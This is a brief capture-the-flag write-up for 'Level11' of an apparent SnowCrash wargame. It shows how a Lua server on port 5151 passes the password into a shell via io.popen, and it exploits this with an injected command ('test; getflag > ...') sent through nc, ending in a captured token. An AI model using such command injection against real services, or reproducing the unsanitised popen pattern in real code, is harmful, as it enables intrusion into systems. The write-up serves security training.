# Level11

We have a lua script which runs a server on port `5151`
Asks for a password and compare the hash which a predefined hash.
But the hash is produced with `io.popen("echo "..pass.." | sha1sum", "r")`
So we can probably insert a commmand in the `pass`.

```shell
level11@SnowCrash:~$ nc localhost 5151
Password: test; getflag > /tmp/level11.flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/level11.flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```